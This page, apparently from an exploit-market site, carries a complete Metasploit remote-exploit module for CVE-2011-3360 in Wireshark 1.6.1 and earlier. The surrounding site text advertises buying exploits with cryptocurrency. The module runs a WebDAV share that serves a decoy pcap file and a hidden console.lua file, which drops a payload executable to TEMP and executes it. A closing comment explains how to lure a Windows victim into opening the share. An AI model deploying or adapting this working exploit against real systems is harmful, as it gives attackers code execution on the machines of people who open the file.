			<meta name='description' content=""> 
			<meta name='keywords' content=""> 
		
		<link rel='stylesheet' href='/style?1592063336' type='text/css' media='all' />
		<link rel='stylesheet' href='/skin/green?1592063336' type='text/css' media='all' />
		<link rel='stylesheet' href='/qtip_style' type='text/css' media='all' />
		<link rel='stylesheet' href='/fancybox_style' >
		<script type='text/javascript' src='/jquery'></script>
		<script type='text/javascript' src='/qtip_js'></script>
		<script type='text/javascript' src='/upl1'></script>
		<script type='text/javascript' src='/upl2'></script>
		<script type='text/javascript' src='/fancybox'></script>
		<script src='/chart_js'></script>
		<script type='text/javascript'>
			$(document).ready(function() {
				$('.popup').fancybox({
					fitToView	: true,
					autoSize	: true,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
				$('.popup_modal').fancybox({
					modal	: true, 
					width   : '100%',
					height  : '100%',
					fitToView	: true,
					autoSize	: false,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
			});
		</script>
		<script type='text/javascript'>
			  var _gaq = _gaq || [];
			  _gaq.push(['_setAccount', 'UA-23466659-1']);
			  _gaq.push(['_trackPageview']);
			  (function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
			  })();
		</script>
	</head>
	<body  onload='onloadpage()' ><div class='menu' style='text-align:center; width:1200px;'>[ <a href='/'>home</a> ]&nbsp;&nbsp;[ <a href='/private' class=''>private</a> ]&nbsp;&nbsp;[ <a href='/0day' class='RedText'>0Day</a> ]&nbsp;&nbsp;[ <a href='/discount'>discount</a> ]&nbsp;&nbsp;[ <a href='/gold' class='YellowTextGold'> Get Gold </a> ]&nbsp;&nbsp;[ <a href='/platforms'>platforms</a> ]&nbsp;&nbsp;[ <a href='/pentest'>pentest</a> ]&nbsp;&nbsp;[ <a href='/hash'>hash</a> ]&nbsp;&nbsp;[ <a href='/search'>search</a> ]&nbsp;&nbsp;[ <a href='/faq' class='RedText'>faq</a> ]&nbsp;&nbsp;[ <a href='/contacts'>contact</a> ]&nbsp;&nbsp;[ <a href='/style/change' alt=''>style</a> ]&nbsp;&nbsp;[ <a href='/btc/change' class='YellowTextBtc'>Prices in Gold</a> ]&nbsp;&nbsp;&nbsp;<span class='YellowText'>db:</span> <span class='RedText'>34 387</span>&nbsp;&nbsp;&nbsp;&nbsp;<div class='menu_icon'><a title='0day Today Exploit DB Official Facebook' href='http://www.facebook.com/Inj3ct0rs' target='_Blank'><img src='/img/fb.png' alt='0day Today Exploit DB Official Facebook'></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official Twitter ' href='http://twitter.com/Inj3ct0r' target='_Blank'><img src='/img/tw.png' alt='0day Today Exploit DB Official Twitter '></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official RSS Channel' href='/rss' target='_Blank'><img src='/img/rss.png' alt='0day Today Exploit DB Official RSS Channel'></a></div> <div class='menu_icon'><a title='Tor Network' href='http://mvfjfugdwgc5uwho.onion' target='_Blank'><img src='/img/tor3.png' alt='Tor'></a></div> </div><div class='content'>
				<div class='popup_welcome ' id='popup_welcome_div'>
					<a href='#popup_welcome_div' class='popup' id='popup_welcome'>&nbsp;</a>
					<div class='pop_up_welcome_title'>
						<strong><span class='RedText'>0day.today - Biggest Exploit Database in the World.</span></strong>
						<div style='float:right; margin-top:-5px; heigth:24px; line-height:16px; '>
							<div style='float:left; margin-top:3px;'>Select your language: &nbsp;</div>
							<a class='' href='http://en.0day.today/exploit/16860'>
								<img src='/img/langs/en.png' alt='English'>
								<div class='TipText'>
									English
								</div>
							</a><a class='' href='http://ru.0day.today/exploit/16860'>
								<img src='/img/langs/ru.png' alt='Русский'>
								<div class='TipText'>
									Русский
								</div>
							</a><a class='' href='http://de.0day.today/exploit/16860'>
								<img src='/img/langs/de.png' alt='Deutsch'>
								<div class='TipText'>
									Deutsch
								</div>
							</a><a class='' href='http://tr.0day.today/exploit/16860'>
								<img src='/img/langs/tr.png' alt='Türkçe'>
								<div class='TipText'>
									Türkçe
								</div>
							</a><a class='' href='http://fr.0day.today/exploit/16860'>
								<img src='/img/langs/fr.png' alt='Français'>
								<div class='TipText'>
									Français
								</div>
							</a><a class='' href='http://it.0day.today/exploit/16860'>
								<img src='/img/langs/it.png' alt='Italiano'>
								<div class='TipText'>
									Italiano
								</div>
							</a><a class='' href='http://es.0day.today/exploit/16860'>
								<img src='/img/langs/es.png' alt='Español'>
								<div class='TipText'>
									Español
								</div>
							</a><a class='' href='http://ro.0day.today/exploit/16860'>
								<img src='/img/langs/ro.png' alt='Romania'>
								<div class='TipText'>
									Romania
								</div>
							</a><a class='' href='http://pl.0day.today/exploit/16860'>
								<img src='/img/langs/pl.png' alt='Polskie'>
								<div class='TipText'>
									Polskie
								</div>
							</a><a class='' href='http://ar.0day.today/exploit/16860'>
								<img src='/img/langs/ar.png' alt='العربية'>
								<div class='TipText'>
									العربية
								</div>
							</a><a class='' href='http://jp.0day.today/exploit/16860'>
								<img src='/img/langs/jp.png' alt='Japan'>
								<div class='TipText'>
									Japan
								</div>
							</a><a class='' href='http://cn.0day.today/exploit/16860'>
								<img src='/img/langs/cn.png' alt='China'>
								<div class='TipText'>
									China
								</div>
							</a>
						</div>
					</div>
					
					<div style='float:left; background:#000; width:480px; border-right:1px solid #004000; text-align:justify; margin:10px 0px 0px 0px; padding:0px 15px 0px 0px;'>
						<div class='centertext'><img src='/img/logo_green.jpg' style='width:400px;'></div>
						<div class='spacer'></div>
						Things you should know about 0day.today: 
						<ul>
						<li>We use one main domain: <a href='http://0day.today'>http://0day.today</a></li>
						<li>Most of the materials is <span class='YellowText'>completely FREE</span></li>
						<li>If you want to <span class='RedText'>purchase the exploit</span> / <span class='RedText'>get V.I.P. access</span>  or pay for any other service, <br>you need to buy or earn <img src='/img/gold.gif'> <span class='GoldText'>GOLD</span></li>
					</ul>
						
						<div class='spacer'></div>
						<div class='center'>
							We accept currencies: [<a href='/contacts' target=_blank>contact admin to find more</a>]
							<div class='half_spacer'></div>
							<a href='/gold'><img src='/img/bitcoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/litecoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/ethereum.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							
						</div>
						<div class='spacer'></div>
						<div class='spacer'></div>
						We don't want you to use our site as a tool for hacking purposes, so any kind of action that could 
			affect illegaly other users or websites that you don't have right to access will be banned 
			and your account including your data will be destroyed.<br><br>
			Administration of this site uses the <a href='/contacts' target=_blank>official contacts</a>. Beware of impostors!
						<div class='spacer'></div>
						<div class='spacer'></div>
						<div class='centertext'><a href='/popup/off' class='RedText'>I am registered user of 0day.today. I don't want to see this screen in future.</a></div>
						
					</div>
					<div style='float:left; background:#000; width:300px; padding:10px 0px;'>
						<center><strong><span class='RedText'>What to do first?</span></strong></center>
						<ol style='margin-left:25px;'>
							<li>Read the [ <a href='/law' target='_blank'>agreement</a> ]</li>
							<li>Read the [ <a href='/faq/how_publish' target='_blank'>Submit</a> ] rules</li>
							<li>Visit the [ <a href='/faq' target='_blank'>faq</a> ] page</li>
							<li>[ <a href='/reg' target='_blank'>Register</a> ] profile</li>
							<li>Get [ <a href='/gold' target='_blank'>GOLD</a> ]</li>
							<li>If you want to [ <a href='/faq/sell' target='_blank'>sell</a> ]</li>
							<li>If you want to [ <a href='/faq/buy' target='_blank'>buy</a> ]</li>
							<li>If you lost [ <a href='restore' target='_blank'>Account</a> ]</li>
							<li>Any questions [ <a href='mailto:admin@0day.today'>admin@0day.today</a> ]</li>
						</ol>
						<br>
						<br>
						
						<center><strong><span class='RedText'>Main links</span></strong></center>
						<ul style='margin-left:25px;'>
							<li><a href='/auth'>Authorisation page</a></li>
							<li><a href='/reg'>Registration page</a></li>
							<li><a href='/restore'>Restore account page</a></li>
							<li><a href='/faq'>FAQ page</a></li>
							<li><a href='/contacts'>Contacts page</a></li>
							<li><a href='/faq#submit'>Publishing rules</a></li>
							<li><a href='/law'>Agreement page</a></li>
						</ul>
						<br>
						<br>
						
						<center><strong><span class='RedText'>You can contact us by</span></strong></center><br>
						<div class='popup_contacts_items popup_contacts_mail'>
							<div class='popup_contacts_items_title '>Mail:</div> 
							<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
						</div>
						<!--<div class='popup_contacts_items popup_contacts_jabber'>
							<div class='popup_contacts_items_title '>Jabber:</span></strong></div> 
							<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
						</div>
						<div class='popup_contacts_items popup_contacts_skype'>
							<div class='popup_contacts_items_title '>Skype:</span></strong></div> 
							<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
						</div>
						-->
						<div class='popup_contacts_items popup_contacts_fb'>
							<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
						</div>
						<div class='popup_contacts_items popup_contacts_twitter'>
							<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
						</div>
					</div>
				</div>
		<div class='head_auth'>
				<div class='menu_icon'><img src='/img/lock.png'></a></div> 
				[ <a href='/auth' class='RedText'>authorization</a> ] 
				[ <a href='/reg' class='RedText'>registration</a> ] 
				[ <a href='/restore' class='RedText'>restore account</a> ] 
			</div>
			<div class='head_contacts '>
				<a href='#contacts_popup' class='popup'>
				<img src='/img/mail3.png'>
				Contact us
				<!--<img src='/img/skype.png'>
				<img src='/img/jabber.png'>-->
				
				</a>
			</div>
			<div id='contacts_popup'>
				<div class='category_text strong'><span class='RedText'>You can contact us by:</span> </div>
				<div class='spacer'></div>
				<div class='popup_contacts_page'>
					<div class='popup_contacts_items popup_contacts_mail'>
						<div class='popup_contacts_items_title '>Mail:</div> 
						<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
					</div>
					
					<!--<div class='popup_contacts_items popup_contacts_jabber'>
						<div class='popup_contacts_items_title YellowText'>Jabber:</span></strong></div> 
						<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
					</div>
					<div class='popup_contacts_items popup_contacts_skype'>
						<div class='popup_contacts_items_title YellowText'>Skype:</span></strong></div> 
						<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
					</div>-->
					
					<div class='popup_contacts_items popup_contacts_fb'>
						<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
					</div>
					<div class='popup_contacts_items popup_contacts_twitter'>
						<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
					</div>
				</div>
			</div>
			
			
				<div class='head'>
					<div class='double_spacer'></div>
					<div class='double_spacer'></div><a href='/'><img src='/img/logo_green.jpg' alt='0day Today Exploits Market and 0day Exploits Database'></a>
					
					
				</div>
						
				
					<style>
					.fancybox-inner {
						background:#000000 url(/img/bg.gif);
					}
					.content{border:1px solid #008000; }
					</style>
					
						
						<script type='text/javascript' src='/hightlight_lib'></script>
						<script type='text/javascript' src='/hightlight/plain'></script>
						
						<link type='text/css' rel='stylesheet' href='/hightlight_style?1592063336'/>
						<script type='text/javascript'>SyntaxHighlighter.all();</script>
						
						
						
						
							<div style='font-size:11px; font-weight:bold;'>
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Author</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/author/2911' target=_blank>metasploit</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Risk</div>
									<div style='float:left; width:190px; margin:5px 0px 0px 0px;' ><img src='/img/risk/critlow_0.gif'> [<span style='font-size:9px;'><div class='tips_risk_color_0'>Security Risk Unsored</div></span>]</div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>0day-ID</div>
									<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/exploit/description/16860' target=_blank>0day-ID-16860</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Category</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/remote'>remote exploits</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Date add</div>
									<div style='float:left; width:190px;margin:5px 0px 0px 0px;' ><a href='/date/18-11-2011'>18-11-2011</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Platform</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/platforms/windows'>windows</a></div>
									
									
								<div class='clear'></div>
									
							</div>
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            'Description'    => %q{
                    This modules exploits a vulnerability in Wireshark 1.6 or less. When opening a
                pcap file, Wireshark will actually check if there's a 'console.lua' file in the same
                directory, and then parse/execute the script if found.  Versions affected by this
                vulnerability: 1.6.0 to 1.6.1, 1.4.0 to 1.4.8
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'sinn3r',  #Metasploit
                ],
            'References'     =>
                [
                    ['CVE', '2011-3360'],
                    ['OSVDB', '75347'],
                    ['URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=6136'],
                    ['URL', 'http://technet.microsoft.com/en-us/security/advisory/2269637']
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00",
                },
            'DefaultOptions'  =>
                {
                    'ExitFunction' => "none"
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    ['Wireshark 1.6.1 or less', {}],
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Jul 18 2011",  #Didn't go public until 2011-09-21 though
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptPort.new('SRVPORT',     [ true, "The daemon port to listen on (do not change)", 80 ]),
                OptString.new('SHARENAME', [ true, "The name of the top-level share.", "files"]),
                OptString.new('URIPATH',   [ true, "The URI to use", "/" ]),
                OptString.new('FILENAME',  [ true, "The name of the pcap file", "msf.pcap"])
            ], self.class)
 
        deregister_options('SSL', 'SSLVersion') # WebDAV does not support SSL
    end
 
    def on_request_uri(cli, request)
        case request.method
        when 'OPTIONS'
            process_options(cli, request)
        when 'PROPFIND'
            process_propfind(cli, request)
        when 'GET'
            process_get(cli, request)
        else
            print_status("#{cli.peerhost}:#{cli.peerport} #{request.method} => 404 (#{request.uri})")
            resp = create_response(404, "Not Found")
            resp.body = ""
            resp['Content-Type'] = 'text/html'
            cli.send_response(resp)
        end
    end
 
    def process_get(cli, request)
        print_status("URI requested: #{request.uri.to_s}")
        if request.uri =~ /\.lua$/
            # Load lua script
            print_status("Sending lua script")
            send_response(cli, @p, {'Content-Type'=>'application/octet-stream'})
        elsif request.uri =~ /#{datastore['FILENAME']}/
            # Load an empty pcap file
            # Format reference: http://wiki.wireshark.org/Development/LibpcapFileFormat
            pcap = ''
            pcap << "\xd4\xc3\xb2\xa1"  #Magic number
            pcap << "\x02\x00"          #Major version number
            pcap << "\x04\x00"          #Minor version number
            pcap << "\x00\x00\x00\x00"  #GMT to local correction
            pcap << "\x00\x00\x00\x00"  #Accuracy of timestamp
            pcap << "\xff\xff\x00\x00"  #Maxlength of captured packets in octets
            pcap << "\x01\x00\x00\x00"  #Data length type
            print_status("Sending fake pcap file")
            send_response(cli, pcap, {'Content-Type'=>'application/octet-stream'})
        else
            # Don't know the request, return not found
            print_error("Don't care about this file, 404")
            send_not_found(cli)
        end
        return
    end
 
    def process_options(cli, request)
        vprint_status("#{cli.peerhost}:#{cli.peerport} OPTIONS #{request.uri}")
        headers = {
            'MS-Author-Via' => 'DAV',
            'DASL'          => '<DAV:sql>',
            'DAV'           => '1, 2',
            'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
            'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
            'Cache-Control' => 'private'
        }
 
        resp = create_response(207, "Multi-Status")
        headers.each_pair {|k,v| resp[k] = v }
        resp.body = ''
        resp['Content-Type'] = 'text/xml'
        cli.send_response(resp)
    end
 
    def process_propfind(cli, request)
        path = request.uri
        vprint_status("Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport} #{path}")
        body = ''
 
        my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
        my_uri    = "http://#{my_host}/"
 
        if path !~ /\/$/
            if path.index(".")
                print_status("Sending 404 for #{path} ...")
                resp = create_response(404, "Not Found")
                resp['Content-Type'] = 'text/html'
                cli.send_response(resp)
                return
            else
                print_status("Sending 301 for #{path} ...")
                resp = create_response(301, "Moved")
                resp["Location"] = path + "/"
                resp['Content-Type'] = 'text/html'
                cli.send_response(resp)
                return
            end
        end
 
        print_status("Sending directory multistatus for #{path} ...")
 
        body = <<-BODY
        <?xml version="1.0" encoding="utf-8"?>
        <D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
        <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
        <D:href>#{path}</D:href>
        <D:propstat>
        <D:prop>
        <lp1:resourcetype><D:collection/></lp1:resourcetype>
        <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
        <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
        <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
        <D:supportedlock>
        <D:lockentry>
        <D:lockscope><D:exclusive/></D:lockscope>
        <D:locktype><D:write/></D:locktype>
        </D:lockentry>
        <D:lockentry>
        <D:lockscope><D:shared/></D:lockscope>
        <D:locktype><D:write/></D:locktype>
        </D:lockentry>
        </D:supportedlock>
        <D:lockdiscovery/>
        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>
        </D:prop>
        <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
        </D:response>
        BODY
 
        body = body.gsub(/^\t\t/, '')
 
        if request["Depth"].to_i > 0
            if path.scan("/").length < 2
                body << generate_shares(path)
            else
                #Set filenames, and set the hidden attribute
                filenames =
                    [
                        ['console.lua', true],
                        [datastore['FILENAME'], false]
                    ]
                body << generate_files(path, filenames)
            end
        end
 
        body << "</D:multistatus>"
 
        body.gsub!(/\t/, '')
 
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp['Content-Type'] = 'text/xml; charset="utf8"'
        cli.send_response(resp)
    end
 
    def gen_timestamp(ttype=nil)
        ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
    end
 
    def gen_datestamp(ttype=nil)
        ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
    end
 
    def generate_shares(path)
        share_name = datastore['SHARENAME']
        share = <<-SHARE
        <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
        <D:href>#{path}#{share_name}/</D:href>
        <D:propstat>
        <D:prop>
        <lp1:resourcetype><D:collection/></lp1:resourcetype>
        <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
        <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
        <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
        <D:supportedlock>
        <D:lockentry>
        <D:lockscope><D:exclusive/></D:lockscope>
        <D:locktype><D:write/></D:locktype>
        </D:lockentry>
        <D:lockentry>
        <D:lockscope><D:shared/></D:lockscope>
        <D:locktype><D:write/></D:locktype>
        </D:lockentry>
        </D:supportedlock>
        <D:lockdiscovery/>
        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>
        </D:prop>
        <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
        </D:response>
        SHARE
        share = share.gsub(/^\t\t/, '')
        return share
    end
 
    def generate_files(path, items)
        trail = path.split("/")
        return "" if trail.length < 2
 
        files = ""
        items.each do |f, hide|
            h = hide ? '1' : '0'
            files << <<-FILES
            <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
            <D:href>#{path}#{f}</D:href>
            <D:propstat>
            <D:prop>
            <lp1:resourcetype/>
            <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
            <lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
            <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
            <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
            <lp2:executable>T</lp2:executable>
            <D:supportedlock>
            <D:lockentry>
            <D:lockscope><D:exclusive/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
            </D:lockentry>
            <D:lockentry>
            <D:lockscope><D:shared/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
            </D:lockentry>
            </D:supportedlock>
            <D:lockdiscovery/>
            <D:getcontenttype>application/octet-stream</D:getcontenttype>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
            <D:ishidden b:dt="boolean">#{h}</D:ishidden>
            </D:propstat>
            </D:response>
            FILES
        end
 
        files = files.gsub(/^\t\t\t/, '')
 
        return files
    end
 
    def get_lua_payload
        # Generate our executable payload, and then convert every byte
        # in decimal format
        p = generate_payload_exe
        buf = ''
        p.each_byte do |b|
            buf << "\\#{b.to_s}"
        end
 
        # Create the lua script that contains our payload
        var_payload_name = rand_text_alpha(5)
        var_temp_name    = rand_text_alpha(5)
        lua_script = <<-LUA
        #{var_payload_name} = "#{buf}"
 
        #{var_temp_name} = os.getenv("TEMP") .. os.tmpname() .. ".exe"
        local f = io.open(#{var_temp_name}, "wb")
        f:write(#{var_payload_name})
        f:close()
        os.execute(#{var_temp_name})
        LUA
 
        lua_script = lua_script.gsub(/^\t\t/, '')
        return lua_script
    end
 
    def exploit
        @p = get_lua_payload
        super
    end
end
 
=begin
Example of how to open the share:
My Computer -> Tools -> Map Network Driver -> Sign up for online storage or
connect to a network server -> Choose another network location ->
enter the network address
 
On an unpatched XP SP3 (and other Windows systems), the ideal URI format is like this:
http://192.168.1.11/
But on a fully patched XP SP3, the same URI format will not work. Windows will try to list
the share via SMB, and the victim will not see the share.  In this case, you should specify
the URI to like this:
http://192.168.1.11/files
=end



